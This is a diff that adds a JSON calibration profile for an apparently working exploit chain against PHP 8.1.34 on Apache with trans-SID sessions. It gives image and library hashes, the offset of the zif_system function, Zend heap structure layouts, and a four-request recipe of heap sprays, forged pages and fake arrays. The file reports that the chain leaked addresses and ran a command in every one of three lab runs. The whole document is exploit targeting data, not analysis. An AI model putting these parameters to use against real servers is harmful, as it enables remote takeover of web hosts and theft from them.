@@ -1,0 +1,221 @@
+{
+  "schema_version": 1,
+  "id": "php-8.1.34-apache-amd64-trans-sid",
+  "verification": {
+    "state": "verified",
+    "runs": 3,
+    "proof": "http-only-fixed-command-local-docker-3-of-3",
+    "verified_at": "2026-10-24T00:00:00Z"
+  },
+  "build": {
+    "image": {
+      "repo_digest": "mirror.gcr.io/library/php@sha256:72f0c0134922985022d55a39b0390d35dc7a10e961aa6c44fa35b4c3102f4268",
+      "image_id": "sha256:e6c924c6e862e6c74e01be964f88cb0c7ccbd673925e9a648cbbf77ff53b7ca1",
+      "platform": "linux/amd64"
+    },
+    "php": {
+      "version": "8.1.34",
+      "sapi": "apache2handler",
+      "zts": false,
+      "debug": false
+    },
+    "libphp": {
+      "path": "/usr/lib/apache2/modules/libphp.so",
+      "sha256": "d92ab65c24d3f3d1528fffb716a35dccf2bfdd0e74618f8bc2e4d5376a04496b",
+      "gnu_build_id": "3132517227bb2a7e9c6ec4dfa9dc9c3c382e25e1",
+      "elf_class": 64,
+      "endianness": "little",
+      "machine": "EM_X86_64",
+      "type": "ET_DYN"
+    }
+  },
+  "symbols": {
+    "zif_system": {
+      "name": "zif_system",
+      "offset": "0x36f470"
+    },
+    "zval_ptr_dtor": {
+      "name": "zval_ptr_dtor",
+      "offset": "0x457150"
+    }
+  },
+  "abi": {
+    "pointer_size": 8,
+    "page_size": "0x1000",
+    "zend_mm_chunk_size": "0x200000",
+    "zend_string": {
+      "size_before_val": "0x18",
+      "len": "0x10",
+      "val": "0x18"
+    },
+    "zval": {
+      "size": "0x10",
+      "value": "0x0",
+      "type_info": "0x8"
+    },
+    "zend_reference": {
+      "size": "0x20",
+      "gc": "0x0",
+      "val": "0x8",
+      "sources": "0x18"
+    },
+    "zend_array": {
+      "size": "0x38",
+      "gc": "0x0",
+      "flags": "0x8",
+      "table_mask": "0xc",
+      "ar_data": "0x10",
+      "num_used": "0x18",
+      "num_elements": "0x1c",
+      "table_size": "0x20",
+      "internal_pointer": "0x24",
+      "next_free": "0x28",
+      "destructor": "0x30"
+    },
+    "zend_execute_data": {
+      "size": "0x50",
+      "opline": "0x0",
+      "call": "0x8",
+      "return_value": "0x10",
+      "func": "0x18",
+      "this": "0x20",
+      "num_args": "0x2c",
+      "prev": "0x30",
+      "symbol_table": "0x38",
+      "call_info": "0x40",
+      "arg1": "0x50"
+    },
+    "types": {
+      "is_string": "0x6",
+      "is_array": "0x7",
+      "is_reference": "0xa",
+      "gc_string": "0x106",
+      "array_ex": "0x307"
+    }
+  },
+  "runtime": {
+    "mpm": "prefork",
+    "workers": 1,
+    "memory_limit": "128M",
+    "post_max_size": "192M",
+    "upload_max_filesize": "192M",
+    "max_input_vars": 1000,
+    "display_errors": false,
+    "file_uploads": true,
+    "session_extension": true,
+    "upload_progress_enabled": true,
+    "session_use_trans_sid": true,
+    "session_use_cookies": false,
+    "session_use_only_cookies": false,
+    "upload_progress_cleanup": true,
+    "url_rewriter_tags": "a=href,area=href,frame=src,form=",
+    "session_name": "PHPSESSID",
+    "upload_progress_name": "PHP_SESSION_UPLOAD_PROGRESS"
+  },
+  "request_recipe": {
+    "strategy": "php81-trans-sid-v1",
+    "query_fields": 5,
+    "a1": {
+      "boundary_len": 10,
+      "nested_parts": 860,
+      "depth": 64,
+      "key_pad": 90,
+      "ctype_lengths": [103, 231],
+      "small_fillers": {
+        "count": 14,
+        "name_len": 103,
+        "value_len": 8
+      },
+      "large_fields": {
+        "count": 65,
+        "value_len": 8000
+      },
+      "burners": {
+        "count": 20,
+        "value_len": 4000
+      },
+      "pad": {
+        "name_len": 5,
+        "value_len": 1216
+      },
+      "progress_len": 4000,
+      "pre_file_scalars": [
+        {
+          "count": 4,
+          "name_len": 8,
+          "value_len": 3000,
+          "prefix": "s",
+          "fill": "V"
+        },
+        {
+          "count": 1,
+          "name_len": 8,
+          "value_len": 850,
+          "prefix": "r",
+          "fill": "R"
+        }
+      ],
+      "pre_file_mix": [170, 400],
+      "file": {
+        "name_len": 32,
+        "filename_len": 32,
+        "content_type_len": 24,
+        "value_len": 1
+      }
+    },
+    "b1": {
+      "boundary_len": 10,
+      "target_offset": "0x1fa120",
+      "fake_len": "0x1c0000",
+      "allocator_overhead": 25,
+      "value_data_offset": 4120,
+      "name_len": 120,
+      "head_forged_fields": 13,
+      "forged_pages": 511,
+      "partial_flood_pages": 400,
+      "tail_forged_fields": 2,
+      "hit_index": 14,
+      "nested_fillers": 900,
+      "expected_prefix": "/14BBBBB",
+      "main_qword_offset": "0x5ec8",
+      "min_dtor_hits": 100,
+      "libphp_delta_min": "0x1800000",
+      "libphp_delta_max": "0x2000000"
+    },
+    "a2": {
+      "boundary_len": 17,
+      "session_value_len": 19,
+      "progress_value": "pwn",
+      "fillers": {
+        "count": 32,
+        "name_len": 7,
+        "value_len": 7
+      },
+      "file": {
+        "name": "f",
+        "filename": "a.txt",
+        "value_len": 64
+      },
+      "large_field": {
+        "name": "big",
+        "value_len": 167772160,
+        "stream_chunk": 65536
+      }
+    },
+    "b2": {
+      "boundary_len": 10,
+      "session_value": "attacksessionid0001",
+      "progress_value": "pwn",
+      "spray_count": 400,
+      "name_len": 4,
+      "value_len": 4071,
+      "reference_offset": "0x74160",
+      "fake_array_offset": "0x74800",
+      "refcount": 1
+    }
+  },
+  "provenance": {
+    "source": "local-docker-http-only-calibration-and-byte-hash-verification",
+    "notes": "Exact PHP 8.1.34 Apache linux/amd64 image and 128M trans-SID runtime. The four-request chain derived heap and libphp addresses from HTTP responses and produced the fixed id>/out/p proof in 3/3 fresh-ASLR runs. The executable remains restricted to an isolated private-address lab and a fixed proof command."
+  }
+}
